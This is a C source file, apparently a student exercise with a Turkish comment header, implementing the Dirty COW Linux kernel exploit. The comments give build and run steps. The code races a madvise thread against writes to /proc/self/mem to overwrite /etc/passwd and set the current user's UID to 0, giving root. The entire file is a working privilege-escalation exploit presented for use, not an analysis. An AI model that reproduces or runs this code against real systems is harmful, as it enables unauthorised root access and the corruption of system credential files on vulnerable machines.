#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <pwd.h>

/*
 * BAYRAM YARIM - 18010011067
 * byyarim@gmail.com
 *
 * Kodu Derleme ve Calistirma İslemleri
 *
 * Sistemde herhangi bir kullanici tanimlayin
 *
 * #$> sudo adduser yenikullanici
 * # kullanici bilgi girislerini yapiniz : sifre, ad soyad vs..
 * #
 * #$> cat /etc/passwd | grep yenikullanici
 * #
 * # Programı derleyin
 * #$> gcc changeusercow.c -o mychanger.bin -lpthread
 * # derleme islemi bittikten sonra mychanger.bin adlı dosya oluşturulacaktır. Programı çalıştırın
 * #$> ./mychanger.bin
 * # Program otomatik olarak yeni eklenen kullaniciyi bulacak ve root yetkisi verecektir.
 * # sonucu görmek icin
 * #$> id
 * # veya
 * #$> cat /etc/passwd | grep yenikullanici
 * # komutunu yaziniz.
 **/

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str = (char *)arg;
  int i, c = 0;
  for (i = 0; i < 100000000; i++)
  {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str = (char *)arg;
  int f = open("/proc/self/mem", O_RDWR);
  int i, c = 0;
  for (i = 0; i < 100000000; i++)
  {
    lseek(f, (uintptr_t)map, SEEK_SET);
    c += write(f, str, strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}

int main(int argc, char *argv[])
{
  pthread_t pth1, pth2;
  name = strdup("/etc/passwd");
  f = open(name, O_RDONLY);
  fstat(f, &st);
  char *towrite = malloc(st.st_size + 1);
  read(f, towrite, st.st_size);
  towrite[st.st_size] = 0;
  close(f);

  char *attackline;
  char *exploitedline;
  struct passwd *attacker = getpwuid(getuid());

  asprintf(&attackline, "%s:%s:%d:%d:%s:%s:%s",
           attacker->pw_name, attacker->pw_passwd, attacker->pw_uid, attacker->pw_gid, attacker->pw_gecos, attacker->pw_dir, attacker->pw_shell);
  asprintf(&exploitedline, "%s:%s:0:%d:%s:%s:%s", attacker->pw_name, attacker->pw_passwd, attacker->pw_gid, attacker->pw_gecos, attacker->pw_dir, attacker->pw_shell);

  char *endoffile = strstr(towrite, attackline) + strlen(attackline);
  char *changelocation = strstr(towrite, attackline);
  int oldfilelen = strlen(towrite);

  sprintf(changelocation, "%s%s", exploitedline, endoffile);

  int linediff = strlen(attackline) - strlen(exploitedline);
  int i;
  for (i = oldfilelen; i > oldfilelen - linediff; i--)
    towrite[i - 1] = '\n';

  f = open(name, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
  printf("mmap %zx\n\n", (uintptr_t)map);

  pthread_create(&pth1, NULL, madviseThread, name);
  pthread_create(&pth2, NULL, procselfmemThread, towrite);

  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}